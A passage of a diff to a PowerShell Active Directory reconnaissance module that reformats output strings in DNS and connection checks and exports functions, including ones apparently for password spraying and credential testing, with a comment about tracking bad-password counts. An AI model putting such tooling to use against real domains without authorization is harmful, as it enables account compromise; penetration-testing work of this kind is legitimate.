+                #!!!!!!!!!!!!!!!!!!!!! Check if PDC should be autoselect to get accurate badpassword count!!!!!!!!!!!!
                 #if valid domain used and can be resolved take the first dc ip.
                 $dcip = Resolve-DnsName -Type A -Name $domain -ErrorAction Stop | select-object -ExpandProperty IPAddress -First 1
-                Write-host "[+] Domainname can be resolved:"$dcip
+                Write-host "[+] Domainname can be resolved: $dcip"
                 $ADScout.DnsOK = $true
             } catch {
-                Write-Host "[-] Can't resolve (DNS):"$domain
-                $dcip = Read-Host "[i] Specify DC IP"
+                $ADScout.DnsOK = $false
+                Write-Host "[-] Can't resolve (DNS): $domain"
+                $dcip = Read-Host "[i] Specify DC IP (idealy the PDC)"
             }
         }
 
         #Verify reachability of the Domain and if the right domainname provided
-        Write-Host "[*] Trying to get domain info from:"$domain" using DC IP: "$dcip
+        Write-Host "[*] Trying to get domain info from:$domain using DC IP: $dcip"
         try {
             $domaintest = get-addomain -Identity $domain -Server $dcip -ErrorAction Stop          
         } 
@@ -873,13 +622,13 @@ function ADS-connectionchecks
         #Handle auth issues
         catch [Microsoft.ActiveDirectory.Management.ADServerDownException] {
             Write-Host "[!] Connection issue: $PSItem" -ForegroundColor DarkRed
-            Write-Host "[*] Test connection: TCP 9389 on"$dcip
+            Write-Host "[*] Test connection: TCP 9389 on $dcip"
             if (ADS-portcheck $dcip 9389) {
-                Write-Host "[+] Connection OK - TCP 9389 on"$dcip
+                Write-Host "[+] Connection OK - TCP 9389 on $dcip"
                 Write-Host "[!] No idea whats wrong :-(" -ForegroundColor DarkRed
                 throw
             } else {
-                Write-Host "[!] Can't connect to ADWeb Service: "$PSItem -ForegroundColor DarkRed
+                Write-Host "[!] Can't connect to ADWeb Service: $PSItem" -ForegroundColor DarkRed
                 Remove-Variable dcip -Force
             }
         }
@@ -913,7 +662,7 @@ function ADS-connectionchecks
             $ADScout.Domain = $domain
             $ADScout.Dcip = $dcip
             $ADScout.DN = $domaintest.DistinguishedName
-            Write-Host "[+] Connection check successfull with:"$domain
+            Write-Host "[+] Connection check successfull with: $domain"
             #Write config to disk
             ADS-writeconfig
         }
@@ -921,7 +670,7 @@ function ADS-connectionchecks
 }
 
 ## Maybe alternativ if no RSAT ([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
-Export-ModuleMember -Function ADS-commands,ADS-getDomainInfo,ADS-connectionchecks,ADS-cpshell,ADS-testcred,ADS-title,ADS-expwspraying,ADS-portcheck, ADS-out
+Export-ModuleMember -Function ADS-commands,ADS-getDomainInfo,ADS-connectionchecks,ADS-cpshell,ADS-testcred,ADS-title,ADS-expwspraying,ADS-portcheck, ADS-out, ADS-explorerUsers
 #Export-ModuleMember -function *
 
 
